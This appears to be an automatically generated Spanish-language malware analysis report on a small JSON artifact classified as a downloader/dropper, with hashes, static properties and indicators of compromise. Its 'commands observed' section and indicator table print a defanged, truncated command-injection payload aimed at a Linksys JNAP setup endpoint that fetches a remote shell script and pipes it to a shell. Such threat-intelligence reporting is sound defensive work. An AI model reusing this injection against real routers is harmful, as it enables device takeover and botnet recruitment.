# 🧬 Payload Analysis

`8f34e92df6a2e369794e7e475827b0a085c35cb35ac7a7e2c61a63e21c394bed`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8f34e92df6a2e369794e7e475827b0a085c35cb35ac7a7e2c61a63e21c394bed`
- **MD5:** `937786e2747693e53dd148e9602c42f5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 236 B |
| Entropía | 5.13 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://linksys[.]com/jnap/setup/SetupWizard | strings |
| hash | 8f34e92df6a2e369794e7e475827b0a085c35cb35ac7a7e2c61a63e21c394bed | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/setup/SetupWizard","command":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|s | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
